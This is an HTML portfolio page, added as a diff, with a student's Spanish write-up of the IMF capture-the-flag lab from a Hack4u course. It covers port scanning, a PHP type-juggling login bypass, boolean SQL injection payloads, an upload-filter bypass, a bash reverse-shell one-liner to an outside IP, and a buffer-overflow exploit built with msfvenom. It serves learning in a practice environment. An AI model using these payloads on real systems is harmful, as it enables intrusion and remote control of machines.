@@ -1,0 +1,112 @@
+<!doctype html><html lang="es"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="description" content="Portfolio de Daniel Escolar: ciberseguridad junior, SOC, Blue Team y laboratorios documentados."><title>IMF curso Hack4u · Daniel Escolar</title><link rel="stylesheet" href="styles.css"></head><body><a class="skip" href="#contenido">Saltar al contenido</a><header class="nav"><div class="wrap"><a class="brand" href="index.html">DE<b>.</b></a><nav aria-label="Navegación principal"><a href="index.html#perfil">Perfil</a><a href="index.html#laboratorios">Laboratorios</a><a href="index.html#contacto">Contacto ↗</a></nav></div></header><main id="contenido" class="article"><a class="muted" href="index.html#laboratorios">← Todos los laboratorios</a><p class="eyebrow">Laboratorio · Linux</p><h1>IMF curso Hack4u</h1><p class="lead">Laboratorio guiado con enumeración web y explotación de un desbordamiento de búfer.</p><p class="tag">Web · Buffer overflow</p><div class="intro"><h2 style="margin-top:0">Resultado documentado</h2><p>La nota declara la resolución final con un shellcode en formato Python.</p></div><details open><summary>Apuntes de la resolución</summary><p class="notice">Texto adaptado desde mis apuntes de laboratorio. Las capturas no se incluyen en esta edición; algunos pasos remiten a ellas. El cierre se ha seleccionado por lo descrito en el texto, sin repetir técnicamente la explotación.</p><h2>IMF curso Hack4u</h2>
+<h2>Descubrimiento de la ip en nuestra red local</h2>
+<p>En esta máquina comenzamos comprobando si tenemos conexión con ella en nuestra localhost con el siguiente comando:</p>
+<pre><code>arp-scan -I ens33 -localnet -ignoredups</code></pre>
+<p>Con esto conseguimos ver la ip de la máquina que vamos a vulnerar.</p>
+<p>En este caso la dirección ip de la máquina la podemos distinguir del resto por la descripción de la dirección MAC, VMware, Inc.</p>
+<p>Una vez identificamos la máquina, procedemos a lanzarle un ping para ver si tenemos conexión con ella. Como podemos observar , esta máquina no devuelve la traza ICMP, por lo que debe de tener algún tipo de firewall.</p>
+<p>Acto seguido procedemos a escanear la ip destino con el Nmap.</p>
+<p>&lt;hr&gt;</p>
+<h2>Descubrimiento de puertos de la máquina</h2>
+<p>Como podemos ver utilizamos la siguiente metodología de descubrimiento de puertos por TCP:</p>
+<pre><code>nmap -p- --open --min-rate 5000 -n -Pn -vvv [ip de maquina objetivo] -oG allports</code></pre>
+<p>Mientras se realizaba el escaneo de la ip objetivo, utilizamos <code>whatweb</code> en consola para ver que tecnologías utiliza por detrás la página web objetivo para ver si vemos algo vulnerable.</p>
+<p>Esto nos podría dar pistas de cuál será nuestro vector de ataque.</p>
+<h2>Abriendo la página web</h2>
+<p>Según abrimos la página web podemos ver lo siguiente:</p>
+<p>Tenemos tres pestañas; Home, Projects y Contact Us.</p>
+<p>En la pestaña contact us podemos ver información que puede ser sensible:</p>
+<p>También vemos un formulario, el cual tenemos que averiguar si es vulnerable.</p>
+<p>Por motivos del ejercicio de la academia nos adelanta que no es un vector de ataque , pero es algo que deberíamos probar nosotros. </p>
+<p>Como vemos nos quedamos sin opciones así que revisamos el código fuente:</p>
+<p>Según empezamos a revisar el código fuente podemos observar que hay un directorio Js con nombres un poco raros los cuales nos recuerda a base64.</p>
+<p>Con el comando curl nos lo traemos a nuestra consola y lo tratamos para unificar las 3 cadenas base64:</p>
+<p>Lo decodificamos:</p>
+<p>Y volvemos a hacer lo mismo con el siguiente base64:</p>
+<p>Esto nos da una pista de que podría ser un directorio de la propia página web.</p>
+<h2>Página imfadministrator</h2>
+<p>Ingresamos a esa posible dirección y esto es lo que nos sale:</p>
+<p>Recordando que tenemos posibles usuarios, utilicemos por ejemplo rmichaels, utilizando el nombre rmichaels y la contraseña test, podemos ver que nos da pistas de que el usuario es válido: </p>
+<p>Vamos a probar , suponiendo que este panel de autenticación conecta con una base de datos, diferentes inyecciones SQL para poder bypasearlo.</p>
+<p>Probando Inyección SQL, NoSQL y XPath inyection, no conseguimos nada.</p>
+<p>Revisando el código fuente una vez más podemos ver lo siguiente:</p>
+<p>Básicamente han hard-codeado la contraseña en el código, por lo que si esta está mal scripteada, esto podría suponer un futuro type Juggling.</p>
+<p>Nos abrimos Burpsuite, para realizar la prueba del type Juggling.</p>
+<p>Efectivamente, en burpsuite, poniendo lo siguiente:</p>
+<pre><code>username=rmichaels &amp; password[]=test</code></pre>
+<p>Conseguimos bypasear el check en php.</p>
+<p>Después vemos lo siguiente: </p>
+<p>Clickando en el enlace, podemos ver lo siguiente:</p>
+<p>Por lo que podemos llegar a la conclusión de que el apartado Home, upload report y disavowed list son scripts en php que están en el directorio seteado como página web.</p>
+<p>Tratando de acceder al recurdo uploads, por ejemplo, mediante su extensión php: </p>
+<p>Podemos ver que este recurso no existe, probando con Home y Disavowed list nos pasa lo mismo. Descartando este vector de ataque probamos un posible lfi o rfi. </p>
+<p>Tratamos de llegar mediante directory path traversal pero tampoco da resultados. La opción siguiente es probar que esto sea gestionado mediante una base de datos:</p>
+<p>Y efectivamente usando una comilla simple siguiente de home, nos salta un error.</p>
+<p>Ahora toca averiguar que tipo de error utilizaremos para hacer las inyecciones.</p>
+<h2>Inyección booleana.</h2>
+<p>Nos damos cuenta que utilizando la condición <code> home&#x27; or &#x27;1&#x27;=&#x27;1</code> nos lleva a una página la cual ya no salta el error:</p>
+<p>Si cambiamos, por ejemplo, la condición booleana a <code>home&#x27; &#x27;1&#x27;=&#x27;2</code> podemos ver lo siguiente: </p>
+<p>Por lo que podemos intuir que cuando la condición es <code>true</code> nos pone <code>under construction</code> y si es <code>false</code> nos pone <code>Welcome to the IMF Administration</code> </p>
+<p>En base a esto nos podemos montar un script en python, con pura metodología, ya que siempre es igual, para automatizar esto.</p>
+<p>Tras realizar el script  podemos ver como nos muestra las siguientes bases de datos: </p>
+<p>Nos centraremos en la base de datos admin:</p>
+<p>Averiguamos lo siguiente, que admin solo tiene la tabla pages:</p>
+<p>Ahora nos centraremos en la tabla <code>pages</code>. En el recurso <code>pages</code> nos encontramos con la la columna <code>tutorials-incomplete</code> si nos metemos podremos ver una supuesta página web sin terminar donde aparece un código Qr. </p>
+<p>Usando un descifrador en línea de qr, nos muestra la siguiente flag:</p>
+<p>La flag si la descodificamos , nos muestra un supuesto recurso php. Si lo introducimos en la página web, nos lleva a la siguiente página:</p>
+<h2>Abuso de subida de archivos</h2>
+<p>Probando el típico archivo php malicioso para poder controlar que comando insertamos resulta que el formato no nos lo permite, por lo que haciendo uso de los magic numbers, escribimos <code>GIF8;</code> dentro del archivo y cambiamos la extensión a <code>.gif</code>.</p>
+<p>De esta manera si se nos permite realizar subida de archivos pero nos salta un firewall, el cual detecta que estamos subiendo código php malicioso. Para pasar este firewall podemos escribir system en hexadecimal. </p>
+<p>De esta manera conseguimos subir el archivo y tener ejecución remota de comandos. Nos entablamos una reverse shell con el típico one liner: </p>
+<p><code>bash -c &quot;bash -i &gt;%26 /dev/tcp/192.168.1.150/443 0&gt;%261&quot;</code> </p>
+<p>Lo de <code>%26</code> es el <code>&amp;</code> pero url encodeado para evitar problemas.</p>
+<p>Tras esto y ponernos en escucha por el puerto 443 con netcat, <code> nc -nlvp 443</code> , ya tenemos la reverse shell. Ahora realizamos el tratamiento de la shell.</p>
+<p>Tras esto ya tenemos una terminal completamente tratada y lista.</p>
+<h2>Buffer overflow</h2>
+<p>Una vez accedemos al sistema, analizando en lo que hay en el directorio en el cual estamos haciendo un <code>ls</code> podemos ver un archivo <code>flag5.txt</code>. Al abrirlo y comprobar que hay , hay una cadena, nuevamente, en base64.</p>
+<p>Al decodificarla podemos ver que nos da una última pista: <code>agentservices</code>.</p>
+<p>Buscamos en el sistema por el archivo llamado <code>agent</code> con el comando <code>find / -name &quot;agent&quot; 2&gt;/dev/null</code> y encontramos lo siguiente: </p>
+<p>Utilizando el comando <code>file</code> podemos ver que es un binario de 32 bits.</p>
+<p>Abriendo el otro archivo con el nombre agent podemos ver lo siguiente: </p>
+<p>Podemos ver que es un binario que el propietario es root y se ejecuta en el puerto 7788. </p>
+<p>Si llevamos a cabo un poco de descubrimiento de puertos dentro de la propia máquina podremos ver lo siguiente:</p>
+<p>Efectivamente el puerto <code>7788</code> está abierto, si tratamos de conectarnos sucede lo siguiente: </p>
+<p>Nos pide el identificador del agente, el cual, parece que lo está comparando. Nos traemos el binario a local para analizarlo con <code>ghidra</code>.</p>
+<h2>Analizando el binario</h2>
+<p>&lt;hr&gt;</p>
+<p>Cómo abrimos el ghidra?, Con el siguiente comando:</p>
+<p><code> ghidra 2&gt; /dev/null &amp; disown</code> y cambiamos de pestaña. Ghidra es un alias del script original.</p>
+<p>Al abrirlo vemos lo siguiente:</p>
+<p>Para añadir un nuevo proyecto nos vamos a <code>file</code> , <code> new project</code> , <code>non-shared project</code> y ``select project location.</p>
+<p>Al tener ya el directorio donde vamos a trabajar nos vamos a <code>file</code> , <code>import file</code> y subimos el binario que queramos analizar.</p>
+<p>Una vez hayamos subido el binario a nuestro directorio de trabajo lo que tenemos que hacer es arrastrar el binario que nos aparcerá en <code>active project</code> hacia el dragón verde y ahí comenzará el análisis.</p>
+<p>Como hemos visto en al conectarnos con netcat al puerto 7788, nos pide un número de agente. Este número de agente estará hard-codeado en el código muy probablemente.</p>
+<p>Nos vamos a la <code>function main</code> y podemos ver lo siguiente:</p>
+<p>Como podemos ver es el inicio que vimos al conectarnos con netcat. Al analizarlo nos encontramos una variable <code>ivar3</code> la cual almacena una función que hace comparativas de dos strings, en este caso <code>local_22 y local_28</code>. </p>
+<p>Nos damos cuenta que si esta comparativa es exitosa nos llevará hacia un menú con más opciones. </p>
+<p>Si analizamos <code>local_22</code> nos damos cuenta que el imput del usuario se almacena con una función segura, en este caso <code>fgets</code> por lo que no sería susceptible a vulnerabilidades. </p>
+<p>Seguimos buscando y vemos que hay una función <code>asprintf()</code> almacenando un valor hexadecimal a una cadena de caracteres, <code>local_28</code> con valor <code>integer</code>. En el propio ghidra podemos cambiar de hexadecimal a decimal para ver su valor.</p>
+<p>Si lo cambiamos a decimal veremos lo siguiente:</p>
+<p>Ya sabemos lo que vale el número de agente y podemos entrar dentro del binario. Nuestro siguiente objetivo es analizar si hay algún vector de entrada vulnerable a buffer overflow.</p>
+<p>Analizando el binario encontramos una función dentro de main, <code>report()</code> al hacer doble click nos lleva a su código y podemos ver lo siguiente:</p>
+<p>Si lo analizamos podemos ver como la función <code>gets()</code> es vulnerable a un buffer overflow. Nuestro siguiente paso es usar <code>gdb</code> para preparar el vector de entrada.</p>
+<p>Yendo al vector donde se aconteceel buffer overflow y ejecutando gdb con el binario tal que así: </p>
+<p><code>gdb ./[binario] -q</code> y posteriormente introduciendo r para ejecutar el binario, nos vamos a la opción 3 la cual está la función 3 e introducimos muchas a, en este caso 200 generadas con python tal que asi: <code> python3 -c &#x27;print(&quot;A&quot;*200)&#x27;</code>.</p>
+<p>Al introducir las 200 a podemos ver lo siguiente:</p>
+<p>Podemos ver como el registro EIP está sobre escrito con nuestras &quot;A&quot;. El siguiente paso es averiguar el offset para saber a partir de cuantos bytes se sobre escribe el EIP.</p>
+<p>En <code>gdb</code> podemos crear un patrón para averiguar cual es el offset con el siguiente comando:</p>
+<p><code>pattern create 200</code> y con el siguiente comando podemos averiguar el offset; <code>pattern offset $eip</code>. Cuando introducimos estos comandos podemos ver lo siguiente:</p>
+<p>Ya hemos averiguado el offset, en este caso 167 bytes antes de que el registro EIP se sobre escriba. </p>
+<p>Checkeando que tipo de seguridad está activa en el binario, podemos ver lo siguiente: </p>
+<p>Nada que nos interese de momento. Checkeando si tenemos aleatorización de la memoria con el siguiente comando: <code> cat /proc/sys/kernel/randomize_va_space</code> podemos ver lo siguiente:</p>
+<p>Por lo que la aleatorización de la memoria está activa. En este caso, y como caso en la clase de hack4u, vamos a utilizar la técnica: <code>rec2reg</code> </p>
+<p>Sin tener que llegar a explotar el <code>rec2libc</code> , esta es una variante aprovechándonos de una llamada a <code>call eax</code>.</p>
+<p>Para sacar la llamada <code>call eax</code> ejecutaremos el siguiente comando: <code>objdump -d {binario} | grep -i &quot;ff d0&quot;</code></p>
+<p>Para saber cual es la dirección <code>call eax</code> utilizaremos la siguiente utilidad: <code>/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb</code></p>
+<p>Y obtendremos la dirección a la llamada <code>call eax</code> para que lea nuestra shellcode.</p>
+<p>El problema es que este shellcode ocupa menos bytes de lo que se necesita para rellenar el offset, por lo que necesitaremos rellenar el espacio necesario restante entre el offset y el eip para poder apuntar a esta dirección estática <code>cal eax</code>.</p>
+<p>Lo haremos con la siguiente línea de código en nuestro script: </p>
+<p><code>payload = shellcode + b&quot;A&quot; * (offset - len(shellcode)) + pack(&quot;&lt;I&quot;, {dirección estática})</code></p>
+<p>Lo segundo que haremos es crear nuestro shellcode para entablarnos una reverse shell con el siguiente comando:  <code>msfvenom -p linux/x86/shell_reverse_tcp LHOST=[MI IP] LPORT=443 -b &#x27;\x00\x0a\x0d&#x27; -f c</code></p>
+<p>Después de esto añadiremos todo a un script y crearemos las conexiones con el localhost y el puerto correspondiente.</p>
+<p>-- IMPORTANTE -- Al final la resolución se llevó a cabo con la creación del shellcode en formato python, con los cambios que conlleva ello.</p></details><div class="actions"><a class="button" href="index.html#laboratorios">← Volver al catálogo</a></div></main><footer><div class="wrap">Daniel Escolar · Ciberseguridad y desarrollo · Laboratorios realizados en entornos de práctica.</div></footer></body></html>
